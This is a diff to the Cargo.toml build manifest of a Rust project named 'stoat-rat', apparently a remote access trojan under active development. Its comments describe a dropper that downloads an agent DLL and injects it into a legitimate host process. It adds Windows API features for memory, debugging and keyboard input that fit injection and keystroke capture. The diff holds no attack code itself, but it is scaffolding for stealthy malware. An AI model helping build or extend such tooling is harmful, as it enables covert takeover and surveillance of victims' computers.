@@ -4,14 +4,20 @@ name = "stoat-rat"
 version = "0.1.0"
 edition = "2021"
 
-# Stage 2 (agent) from src/main.rs; Stage 1 (loader) from src/bin/dropper.rs.
-[[bin]]
-name = "stoat-rat"
-path = "src/main.rs"
+# Library: compiled as an rlib (for the bin) and a cdylib (injectable agent DLL).
+[lib]
+name = "stoat_agent"
+crate-type = ["cdylib", "rlib"]
 
+# Stage 1 loader: downloads/installs the DLL and injects it into a legit host process.
 [[bin]]
 name = "dropper"
 path = "src/bin/dropper.rs"
+
+# Standalone agent exe (for testing without injection).
+[[bin]]
+name = "stoat-rat"
+path = "src/main.rs"
 
 [dependencies]
 anyhow = "1"
@@ -36,8 +42,11 @@ winreg = "0.52"
 windows-sys = { version = "0.59", features = [
     "Win32_Foundation",
     "Win32_Security",
+    "Win32_Storage_FileSystem",
     "Win32_System_Console",
+    "Win32_System_Diagnostics_Debug",
     "Win32_System_LibraryLoader",
+    "Win32_System_Memory",
     "Win32_System_Shutdown",
     "Win32_System_Threading",
     "Win32_UI_Input_KeyboardAndMouse",
